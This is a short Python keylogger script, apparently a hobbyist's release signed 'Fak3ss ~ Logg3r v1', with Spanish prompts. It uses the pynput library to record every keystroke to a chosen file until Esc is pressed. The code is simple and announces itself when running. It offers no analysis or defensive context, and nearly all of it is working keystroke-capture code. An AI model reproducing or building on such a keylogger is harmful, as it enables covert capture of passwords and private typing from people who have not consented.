from pynput import keyboard

log_file = input("Ingresar ruta del keylog.txt: ")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")  

    if key == keyboard.Key.esc:
        print("\nKeylogger detenido.")
        return False

with keyboard.Listener(on_press=on_press) as listener:
    print(f"Keylogger corriendo... Guardando en: {log_file}")
    listener.join()

# Fak3ss ~ Logg3r v1